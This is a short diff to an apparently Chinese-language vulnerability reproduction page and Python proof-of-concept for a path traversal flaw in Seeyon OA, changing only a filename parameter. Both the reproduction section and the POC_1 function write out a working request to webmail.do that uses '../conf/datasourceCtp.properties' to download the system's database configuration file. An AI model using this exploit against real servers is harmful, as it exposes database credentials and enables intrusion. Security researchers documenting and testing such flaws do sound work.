@@ -16,7 +16,7 @@
 
 ## 漏洞复现
 
-访问 url  http://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties
+访问 url  http://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties
 
 存在漏洞的OA 系统将会下载 **datasourceCtp.properties** 配置文件
 
@@ -42,7 +42,7 @@ def title():
     print('+------------------------------------------')
 
 def POC_1(target_url):
-    vuln_url = target_url + "/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties"
+    vuln_url = target_url + "/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
     }
